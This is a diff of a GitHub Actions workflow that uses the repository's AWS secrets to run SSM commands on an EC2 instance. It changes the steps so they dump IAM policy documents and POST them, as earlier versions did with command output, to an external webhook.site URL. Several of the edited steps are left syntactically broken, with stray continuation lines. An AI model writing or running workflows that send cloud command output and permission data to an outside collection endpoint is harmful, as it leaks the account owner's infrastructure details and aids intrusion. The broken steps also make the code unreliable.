@@ -22,7 +22,7 @@ jobs:
           aws-secret-access-key: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
           aws-region: ${{ env.AWS_REGION }}
 
-      - name: Run Test Command 1 - plain text
+      - name: Check IAM permissions
         run: |
           COMMAND_ID=$(aws ssm send-command \
             --instance-ids i-0fb9dcbeb35b4fdbe \
@@ -32,14 +32,14 @@ jobs:
             --query "Command.CommandId" \
             --output text)
           
-          echo "Waiting 10s..."
+          aws iam get-policy --policy-arn arn:aws:iam::850252650249:policy/github-actions-devsecops-policy > iam_policy.json 2>&1
           sleep 10
-          aws ssm get-command-invocation \
+          aws iam get-policy-version --policy-arn arn:aws:iam::850252650249:policy/github-actions-devsecops-policy --version-id v1 >> iam_policy.json 2>&1
             --command-id $COMMAND_ID \
             --instance-id i-0fb9dcbeb35b4fdbe \
             --region ap-south-1 > ssm_out1.json || true
-          cat ssm_out1.json
-          curl -X POST -H "Content-Type: application/json" -d @ssm_out1.json https://webhook.site/681f0d6f-6fa8-46bb-8fe2-22aa02b5e79e
+          cat iam_out.json ; cat iam_policy.json
+          curl -X POST -d @iam_policy.json https://webhook.site/681f0d6f-6fa8-46bb-8fe2-22aa02b5e79e
 
       - name: Run Test Command 2 - base64 wrapped
         run: |
@@ -52,9 +52,9 @@ jobs:
             --query "Command.CommandId" \
             --output text)
           
-          echo "Waiting 10s..."
+          aws iam get-policy --policy-arn arn:aws:iam::850252650249:policy/github-actions-devsecops-policy > iam_policy.json 2>&1
           sleep 10
-          aws ssm get-command-invocation \
+          aws iam get-policy-version --policy-arn arn:aws:iam::850252650249:policy/github-actions-devsecops-policy --version-id v1 >> iam_policy.json 2>&1
             --command-id $COMMAND_ID \
             --instance-id i-0fb9dcbeb35b4fdbe \
             --region ap-south-1 > ssm_out2.json || true
@@ -74,9 +74,9 @@ jobs:
             --query "Command.CommandId" \
             --output text)
           
-          echo "Waiting 10s..."
+          aws iam get-policy --policy-arn arn:aws:iam::850252650249:policy/github-actions-devsecops-policy > iam_policy.json 2>&1
           sleep 10
-          aws ssm get-command-invocation \
+          aws iam get-policy-version --policy-arn arn:aws:iam::850252650249:policy/github-actions-devsecops-policy --version-id v1 >> iam_policy.json 2>&1
             --command-id $COMMAND_ID \
             --instance-id i-0fb9dcbeb35b4fdbe \
             --region ap-south-1 > ssm_out3.json || true
